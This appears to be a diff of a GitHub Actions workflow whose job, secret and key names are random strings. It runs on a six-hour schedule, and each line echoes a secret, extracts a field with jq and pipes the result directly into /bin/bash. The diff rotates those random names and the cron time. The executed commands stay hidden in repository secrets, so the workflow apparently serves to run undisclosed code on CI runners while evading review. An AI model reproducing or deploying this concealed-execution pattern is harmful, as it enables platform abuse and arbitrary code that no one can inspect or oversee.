@@ -1,9 +1,9 @@
 name: renwozui3817
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
-
+    - cron: '18 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: renwozui3817
         env:
-          fuwi74: ${{ secrets.fuwi74 }}
+          uop7831: ${{ secrets.uop7831 }}
         run: |
-          echo $fuwi74 | jq -r .ezz664 | /bin/bash
-          echo $emzxb98 | jq -r .z1553 | /bin/bash
-          echo $x651 | jq -r .kwf7919 | /bin/bash
-          echo $axd16105 | jq -r .t9944 | /bin/bash
-          echo $hqfc78388 | jq -r .pdez98589 | /bin/bash
-          echo $oe7 | jq -r .x1727 | /bin/bash
-          echo $j580 | jq -r .f71828 | /bin/bash
-          echo $f881 | jq -r .tjpum3 | /bin/bash
-          echo $bjkad93 | jq -r .kbsos22 | /bin/bash
-          echo $ccs664 | jq -r .n4 | /bin/bash
-          echo $x7256 | jq -r .lqe6 | /bin/bash
-          echo $z3594 | jq -r .p81 | /bin/bash
+          echo $uop7831 | jq -r .enm3 | /bin/bash
+          echo $pzs4217 | jq -r .kvix62 | /bin/bash
+          echo $kmdam26865 | jq -r .gkmpa00402 | /bin/bash
+          echo $wktb99 | jq -r .mpyw3 | /bin/bash
+          echo $m8311 | jq -r .cdao53097 | /bin/bash
+          echo $uzyq75 | jq -r .gyifr29 | /bin/bash
+          echo $mp83570 | jq -r .crnna40 | /bin/bash
+          echo $cepld73311 | jq -r .wvu29 | /bin/bash
+          echo $ckq216 | jq -r .li171 | /bin/bash
 
